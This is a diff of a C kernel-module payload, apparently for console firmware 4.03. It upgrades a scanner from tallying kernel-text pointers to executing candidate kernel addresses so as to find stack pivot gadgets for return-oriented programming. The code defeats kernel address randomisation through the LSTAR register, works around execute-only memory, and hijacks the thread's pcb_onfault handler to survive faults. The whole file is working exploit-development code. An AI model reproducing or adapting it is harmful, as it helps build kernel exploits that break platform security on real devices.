@@ -1,46 +1,36 @@
 #include <stdint.h>
 
 /*
- * smart_pivot_scan v10 — Unique ktext pages as 16-bit indices
+ * smart_pivot_scan v11 — Execute-test for stack pivot gadgets
  *
- * 3435 total ktext pointers but many are duplicates (same function
- * referenced from multiple vtable entries). Deduplicate by page
- * (4KB aligned) and report as 16-bit page indices.
+ * Can't read ktext (EPT XO), but CAN execute at any ktext address.
+ * For each candidate address, jump there with a controlled stack:
+ *   - fake_stack filled with success_label at every slot
+ *   - real stack: [fake_stack_addr, not_pivot_label, ...]
+ *   - RBP = fake_stack_addr (catches leave;ret too)
  *
- * ktext = 12MB = 3072 pages → page index fits in 12 bits.
- * Pack as 16-bit values: 4 per slot × 4 data slots = 16 per batch.
+ * If candidate is "pop rsp; ...; ret" → lands at success_label → FOUND
+ * If candidate is "pop rXX; ret"     → lands at not_pivot_label → not found
+ * If candidate faults                → pcb_onfault catches → not found
  *
- * Also: two modes controlled by SCAN_BATCH:
- *   SCAN_BATCH < 0x100: report unique page indices (batch N = pages N*16..N*16+15)
- *   SCAN_BATCH = 0xFF:  summary mode — just report total unique pages + range
+ * Tests 49 candidates: 7 function boundaries × 7 offsets (-2 to -8).
+ * Function boundaries from v9 kdata scan of FW 4.03.
  *
- * Slot layout:
+ * Output:
  *   [0] tag|magic
  *   [1] kdata_base
  *   [2] ktext_base
- *   [3] n_unique_pages[15:0] | n_total_ptrs[31:16] | batch[47:32] | flags[63:48]
- *   [4..7] 16 × 16-bit page indices (4 per slot)
+ *   [3] n_candidates_tested
+ *   [4] pivot_bitmap (bit N = candidate N is a pivot)
+ *   [5] fault_bitmap (bit N = candidate N faulted)
+ *   [6] LSTAR
+ *   [7] first_boundary | second_boundary (verification)
  *
- * For summary mode (0xFF):
- *   [4] min_page_idx[15:0] | max_page_idx[31:16] | first_kdata_off[63:32]
- *   [5] LSTAR value
- *   [6] n_unique_pages (full 64-bit for verification)
- *   [7] reserved
+ * Decode: candidate N → boundary N/7, offset (N%7)+2
+ *   gadget = ktext_base + boundary[N/7] - ((N%7)+2)
  */
 
-#ifndef SCAN_BATCH
-#define SCAN_BATCH     0xFF   /* default: summary mode */
-#endif
-
 #define MAGIC_SPVT     0x53505654
-#define KTEXT_SIZE     0xC00000     /* 12MB */
-#define PAGE_SIZE_K    0x1000       /* 4KB */
-#define N_KTEXT_PAGES  (KTEXT_SIZE / PAGE_SIZE_K)  /* 3072 */
-#define SCAN_SIZE      0x400000     /* scan first 4MB of kdata */
-#define PAGES_PER_BATCH 16
-
-/* Bitmap for 3072 pages = 384 bytes = 48 uint64_t */
-#define BITMAP_U64S    ((N_KTEXT_PAGES + 63) / 64)  /* 48 */
 
 typedef struct {
     uint64_t kdata_base;
@@ -54,98 +44,176 @@ static inline uint64_t rdmsr(uint32_t msr)
     return ((uint64_t)hi << 32) | lo;
 }
 
+/* Globals for fault recovery — written before read, no init needed */
+static volatile uint64_t g_saved_rsp;
+static volatile uint64_t g_resume_rip;
+
+__attribute__((naked))
+static void fault_handler(void)
+{
+    __asm__ volatile(
+        "movq g_saved_rsp(%%rip), %%rsp\n\t"
+        "jmpq *g_resume_rip(%%rip)\n\t"
+        ::: "memory"
+    );
+}
+
+/*
+ * Test if executing at 'addr' behaves like a stack pivot.
+ * addr in rdi, fake_stack_ptr in rsi (System V ABI).
+ * Returns: 0=not_pivot, 1=pivot, 2=fault
+ */
+__attribute__((naked, noinline))
+static int test_pivot(uint64_t addr, uint64_t fake_stack_ptr)
+{
+    __asm__ volatile(
+        /* Save callee-saved regs */
+        "pushq %%rbx\n\t"
+        "pushq %%r12\n\t"
+        "pushq %%r13\n\t"
+        "pushq %%r14\n\t"
+        "pushq %%r15\n\t"
+        "pushq %%rbp\n\t"
+
+        /* Save RSP for recovery */
+        "movq %%rsp, g_saved_rsp(%%rip)\n\t"
+
+        /* Point fault handler resume to label 30 */
+        "leaq 30f(%%rip), %%rax\n\t"
+        "movq %%rax, g_resume_rip(%%rip)\n\t"
+
+        /* Fill fake_stack[0..7] with success label address */
+        "leaq 10f(%%rip), %%rax\n\t"
+        "movq %%rax,   (%%rsi)\n\t"
+        "movq %%rax,  8(%%rsi)\n\t"
+        "movq %%rax, 16(%%rsi)\n\t"
+        "movq %%rax, 24(%%rsi)\n\t"
+        "movq %%rax, 32(%%rsi)\n\t"
+        "movq %%rax, 40(%%rsi)\n\t"
+        "movq %%rax, 48(%%rsi)\n\t"
+        "movq %%rax, 56(%%rsi)\n\t"
+
+        /*
+         * Build test stack frame:
+         *   RSP+0  = fake_stack_ptr   (pop rsp reads this)
+         *   RSP+8  = not_pivot_label  (plain ret reads this)
+         *   RSP+16 = not_pivot_label  (safety for pop;pop;ret)
+         *   RSP+24 = not_pivot_label  (safety)
+         *   RSP+32 = not_pivot_label  (safety)
+         *   RSP+40 = not_pivot_label  (safety)
+         */
+        "subq $48, %%rsp\n\t"
+        "movq %%rsi, (%%rsp)\n\t"
+        "leaq 20f(%%rip), %%rax\n\t"
+        "movq %%rax,  8(%%rsp)\n\t"
+        "movq %%rax, 16(%%rsp)\n\t"
+        "movq %%rax, 24(%%rsp)\n\t"
+        "movq %%rax, 32(%%rsp)\n\t"
+        "movq %%rax, 40(%%rsp)\n\t"
+
+        /* RBP = fake_stack_ptr to detect leave;ret */
+        "movq %%rsi, %%rbp\n\t"
+
+        /* JUMP TO CANDIDATE */
+        "jmpq *%%rdi\n\t"
+
+        /* --- Landing pads --- */
+
+        /* 10: PIVOT FOUND — arrived via fake stack */
+        "10:\n\t"
+        "movq g_saved_rsp(%%rip), %%rsp\n\t"
+        "movl $1, %%eax\n\t"
+        "jmp 40f\n\t"
+
+        /* 20: NOT PIVOT — normal return path */
+        "20:\n\t"
+        "movq g_saved_rsp(%%rip), %%rsp\n\t"
+        "movl $0, %%eax\n\t"
+        "jmp 40f\n\t"
+
+        /* 30: FAULT — pcb_onfault brought us here */
+        /*     (RSP already restored by fault_handler) */
+        "30:\n\t"
+        "movl $2, %%eax\n\t"
+
+        /* 40: Common exit — restore callee-saved regs */
+        "40:\n\t"
+        "popq %%rbp\n\t"
+        "popq %%r15\n\t"
+        "popq %%r14\n\t"
+        "popq %%r13\n\t"
+        "popq %%r12\n\t"
+        "popq %%rbx\n\t"
+        "retq\n\t"
+        ::: "memory"
+    );
+}
+
 int module_start(kproc_args* args)
 {
     uint64_t kdata_base = args->kdata_base;
     uint64_t lstar = rdmsr(0xC0000082);
     uint64_t ktext_base = lstar - 0x294218;
-    uint64_t ktext_end = ktext_base + KTEXT_SIZE;
 
     volatile uint64_t* out = (volatile uint64_t*)args;
-
-    /* Use output buffer beyond slot 8 as scratch for bitmap.
-     * Slots 0-7 = 64 bytes. Slots 8+ = 2304-64 = 2240 bytes.
-     * Bitmap needs 384 bytes → fits in slots 8..55. */
-    volatile uint64_t* bitmap = &out[8];
-
-    /* Clear everything */
-    for (int i = 0; i < 2304/8; i++)
+    for (int i = 0; i < 2304 / 8; i++)
         out[i] = 0;
 
     out[0] = ((uint64_t)0xAAAA << 32) | MAGIC_SPVT;
     out[1] = kdata_base;
     out[2] = ktext_base;
 
-    /* Scan kdata and build page bitmap */
-    volatile uint64_t* scan_ptr = (volatile uint64_t*)kdata_base;
-    uint64_t n_qwords = SCAN_SIZE / 8;
-    int n_total_ptrs = 0;
+    /* Set up pcb_onfault */
+    uint64_t curthread;
+    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
+    uint64_t pcb = *(volatile uint64_t*)(curthread + 0x3f8);
+    volatile uint64_t *onfault = (volatile uint64_t *)(pcb + 0xb0);
 
-    for (uint64_t i = 0; i < n_qwords; i++) {
-        uint64_t val = scan_ptr[i];
+    /* Fake stack in scratch area (well beyond visible output) */
+    volatile uint64_t *fake_stack = &out[200];
 
-        if (val >= ktext_base && val < ktext_end) {
-            n_total_ptrs++;
-            uint32_t page_idx = (uint32_t)((val - ktext_base) / PAGE_SIZE_K);
-            if (page_idx < N_KTEXT_PAGES) {
-                bitmap[page_idx / 64] |= (1ULL << (page_idx % 64));
-            }
+    /*
+     * Function boundaries from v9 kdata scan (sorted ktext offsets).
+     * These are entry points of the NEXT function — the bytes just
+     * before each boundary are the epilogue of the previous function.
+     */
+    static const uint32_t boundaries[] = {
+        0x00290d08, 0x00291d10, 0x00291d48, 0x00291d60,
+        0x002932f8, 0x0029e2d8, 0x002a0858
+    };
+    #define N_BOUNDS 7
+    #define MIN_OFF  2    /* test boundary-2 through boundary-8 */
+    #define MAX_OFF  8
+    #define OFFS_PER (MAX_OFF - MIN_OFF + 1)  /* 7 */
+
+    uint64_t pivots = 0;
+    uint64_t faulted = 0;
+    int bit = 0;
+
+    for (int b = 0; b < N_BOUNDS && bit < 49; b++) {
+        for (int off = MIN_OFF; off <= MAX_OFF; off++) {
+            uint64_t addr = ktext_base + boundaries[b] - off;
+
+            /* Re-arm pcb_onfault before each test (may be cleared on fault) */
+            *onfault = (uint64_t)fault_handler;
+
+            int r = test_pivot(addr, (uint64_t)fake_stack);
+
+            if (r == 1) pivots  |= (1ULL << bit);
+            if (r == 2) faulted |= (1ULL << bit);
+            bit++;
         }
     }
 
-    /* Count unique pages and collect indices */
-    int n_unique = 0;
-    uint16_t min_page = 0xFFFF, max_page = 0;
+    /* Clear onfault */
+    *onfault = 0;
 
-    /* Summary mode or paged mode? */
-    int batch = SCAN_BATCH;
-    int skip = batch * PAGES_PER_BATCH;
-    int n_reported = 0;
-    uint16_t results[PAGES_PER_BATCH];
-    for (int i = 0; i < PAGES_PER_BATCH; i++) results[i] = 0;
-
-    for (int pg = 0; pg < N_KTEXT_PAGES; pg++) {
-        if (bitmap[pg / 64] & (1ULL << (pg % 64))) {
-            if (pg < min_page) min_page = pg;
-            if (pg > max_page) max_page = pg;
-
-            if (batch != 0xFF) {
-                if (n_unique >= skip && n_reported < PAGES_PER_BATCH) {
-                    results[n_reported] = (uint16_t)pg;
-                    n_reported++;
-                }
-            }
-            n_unique++;
-        }
-    }
-
-    /* Pack header */
-    out[3] = (uint64_t)(n_unique & 0xFFFF) |
-             ((uint64_t)(n_total_ptrs & 0xFFFF) << 16) |
-             ((uint64_t)(batch & 0xFFFF) << 32) |
-             ((uint64_t)(n_reported & 0xFFFF) << 48);
-
-    if (batch == 0xFF) {
-        /* Summary mode */
-        out[4] = (uint64_t)min_page |
-                 ((uint64_t)max_page << 16) |
-                 ((uint64_t)0 << 32);
-        out[5] = lstar;
-        out[6] = n_unique;
-        out[7] = n_total_ptrs;
-    } else {
-        /* Paged mode: pack 16-bit page indices, 4 per slot */
-        out[4] = (uint64_t)results[0]  | ((uint64_t)results[1] << 16) |
-                 ((uint64_t)results[2] << 32) | ((uint64_t)results[3] << 48);
-        out[5] = (uint64_t)results[4]  | ((uint64_t)results[5] << 16) |
-                 ((uint64_t)results[6] << 32) | ((uint64_t)results[7] << 48);
-        out[6] = (uint64_t)results[8]  | ((uint64_t)results[9] << 16) |
-                 ((uint64_t)results[10] << 32) | ((uint64_t)results[11] << 48);
-        out[7] = (uint64_t)results[12] | ((uint64_t)results[13] << 16) |
-                 ((uint64_t)results[14] << 32) | ((uint64_t)results[15] << 48);
-    }
+    out[3] = (uint64_t)bit;
+    out[4] = pivots;
+    out[5] = faulted;
+    out[6] = lstar;
+    out[7] = (uint64_t)boundaries[0] | ((uint64_t)boundaries[1] << 32);
 
     out[0] = ((uint64_t)0x0001 << 32) | MAGIC_SPVT;
-
     return 0;
 }
